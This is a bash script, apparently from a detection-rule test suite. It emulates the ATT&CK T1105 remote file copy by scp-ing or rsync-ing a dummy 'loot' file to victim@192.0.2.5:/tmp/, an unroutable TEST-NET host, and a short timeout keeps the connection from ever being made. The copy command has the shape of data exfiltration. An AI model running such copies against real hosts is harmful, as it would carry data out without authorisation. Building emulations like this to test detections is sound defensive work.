#!/usr/bin/env bash
# remotecopy.sh - benign emulation of a remote file copy over SSH transport, for detection-rule testing.
#
# What an attacker does: move a tool in or data out with scp/rsync/sftp to a remote user@host:path
# (ingress/egress tool transfer, T1105). This does the harmless analogue: it scp-s a DUMMY file to an
# UNROUTABLE TEST-NET host in batch mode with a short connect timeout, so the connection never
# establishes and nothing is transferred - the remote-spec argv is the signal. download_ip_to_tmp
# covers the HTTP form; this covers the SSH-transport copies. See ./README.md.
#
# Imitates: rules/command-and-control/remote_file_copy.yml - ATT&CK T1105 Ingress Tool Transfer
# Expected rules: remote_file_copy
set -u
work=$(mktemp -d) || exit 0
trap 'rm -rf "$work" 2>/dev/null' EXIT
printf 'dummy\n' > "$work/loot"

# 192.0.2.5 is TEST-NET-1 (RFC 5737): unroutable; the copy times out, nothing is transferred.
# --- TTP: scp to a remote user@host:path -> remote_file_copy (tool + remote_spec) ---
if command -v scp >/dev/null 2>&1; then
	timeout 5 scp -o ConnectTimeout=2 -o BatchMode=yes "$work/loot" victim@192.0.2.5:/tmp/ >/dev/null 2>&1 || true
elif command -v rsync >/dev/null 2>&1; then
	timeout 5 rsync -e 'ssh -o ConnectTimeout=2 -o BatchMode=yes' "$work/loot" victim@192.0.2.5:/tmp/ >/dev/null 2>&1 || true
fi

exit 0
